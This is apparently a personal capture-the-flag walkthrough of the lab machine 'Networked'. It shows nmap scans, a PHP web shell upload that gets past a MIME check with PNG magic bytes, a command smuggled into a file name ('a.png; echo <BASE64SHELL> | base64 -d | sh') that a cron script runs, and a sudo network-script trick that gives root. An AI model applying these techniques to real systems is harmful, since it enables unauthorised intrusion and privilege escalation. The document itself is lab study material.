Target IP: `10.10.10.146`
Source IP: `10.10.14.24`

# NMAP

```
└─$ nmap -sS 10.10.10.146 -p22,80,443
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-11 20:14 EDT
Nmap scan report for 10.10.10.146
Host is up (0.031s latency).

PORT    STATE  SERVICE
22/tcp  open   ssh
80/tcp  open   http
443/tcp closed https

Nmap done: 1 IP address (1 host up) scanned in 0.18 seconds
```

```
─$ nmap -sC -sV 10.10.10.146 -p22,80,443 -oA Networked
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-11 20:15 EDT
Nmap scan report for 10.10.10.146
Host is up (0.031s latency).

PORT    STATE  SERVICE VERSION
22/tcp  open   ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 22:75:d7:a7:4f:81:a7:af:52:66:e5:27:44:b1:01:5b (RSA)
|   256 2d:63:28:fc:a2:99:c7:d4:35:b9:45:9a:4b:38:f9:c8 (ECDSA)
|_  256 73:cd:a0:5b:84:10:7d:a7:1c:7c:61:1d:f5:54:cf:c4 (ED25519)
80/tcp  open   http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
443/tcp closed https

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```


# Port 80

found an index page with some blurb about facemash
Not much going on here

Ran dirb with big.txt and found that a backup path exists

This gave a tar file with contents of the site.

Reading the code for upload and the lib - found that if I can bypass the MIME check ([[image-file-reparing]] using magic bytes) then I have arbitrary file upload for a webshell

file name needs to end in .php.png for it to actually be executed though

Uploaded PentestMonkey PHP shell with first bytes being the PNG magic bytes

Got shell as apache

# Shell as Guly

Found that there are some files globally readable

```
[guly@networked ~]$ ls -la
ls -la
total 36
drwxr-xr-x. 3 guly guly 4096 Mar 12 03:34 .
drwxr-xr-x. 3 root root   18 Jul  2  2019 ..
lrwxrwxrwx. 1 root root    9 Sep  7  2022 .bash_history -> /dev/null
-rw-r--r--. 1 guly guly   18 Oct 30  2018 .bash_logout
-rw-r--r--. 1 guly guly  193 Oct 30  2018 .bash_profile
-rw-r--r--. 1 guly guly  231 Oct 30  2018 .bashrc
-r--r--r--. 1 root root  782 Oct 30  2018 check_attack.php
-rw-r--r--  1 root root   44 Oct 30  2018 crontab.guly
-rw-------  1 guly guly 4680 Mar 12 04:05 dead.letter
drwx------  2 guly guly   60 Mar 12 03:34 .gnupg
-r--------. 1 guly guly   33 Mar 12 01:01 user.txt
```

reading crontab tells me that check_attack.php is running every 3 minutes. This script runs nohup with a variable that's just the filename (which we can now write arbitrary files with arbitrary file names in the upload folder). This happens as it's supposed to detect files that don't have _ delimited IP addresses as file name.

```
touch 'a.png; echo <BASE64SHELL> | base64 -d | sh'
```

The above creates a file with a nice name for rev-shell and works

# Guly to root

Guly has sudo permission to run a script that sets up a new network interface and runs ifup on it, as root with no password. Looking up online, write to an interface allows some code to be executed as root when the interface is pulled up.

[source](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

```
Yes, any script in that folder is executed by root because of the sourcing technique. Ex: . 
/etc/sysconfig/network-scripts/ifcfg-1337
```

This allows running /bin/bash as root due to the script running as root via sudo

==DONE==